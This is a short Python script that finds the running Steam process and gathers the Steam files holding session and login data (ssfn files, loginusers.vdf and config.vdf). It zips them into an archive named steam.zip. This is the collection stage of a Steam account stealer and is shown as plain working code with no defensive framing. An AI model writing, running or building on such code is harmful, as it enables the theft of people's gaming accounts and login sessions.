import os
import zipfile
import psutil

def SteamProcessLocator():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == "Steam.exe":
            return proc.info['pid']
    return None

def CollectSteamFiles(steam_pid):
    try:
        process = psutil.Process(steam_pid)
        steam_path = os.path.dirname(process.exe())
        config_path = os.path.join(steam_path, "config")
        files_to_collect = []

        # Collect ssfn* files
        for file in os.listdir(steam_path):
            if file.startswith("ssfn"):
                files_to_collect.append(os.path.join(steam_path, file))

        # Collect loginusers.vdf
        loginusers_file = os.path.join(config_path, "loginusers.vdf")
        if os.path.exists(loginusers_file):
            files_to_collect.append(loginusers_file)

        # Collect config.vdf
        config_file = os.path.join(config_path, "config.vdf")
        if os.path.exists(config_file):
            files_to_collect.append(config_file)

        return files_to_collect
    except (psutil.NoSuchProcess, FileNotFoundError):
        return []

def CreateZipArchive(files, output_filename="steam.zip"):
    with zipfile.ZipFile(output_filename, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

if __name__ == "__main__":
    steam_pid = SteamProcessLocator()
    if steam_pid is not None:
        collected_files = CollectSteamFiles(steam_pid)
        if collected_files:
            CreateZipArchive(collected_files)
    else:
        print("Steam process not found.")
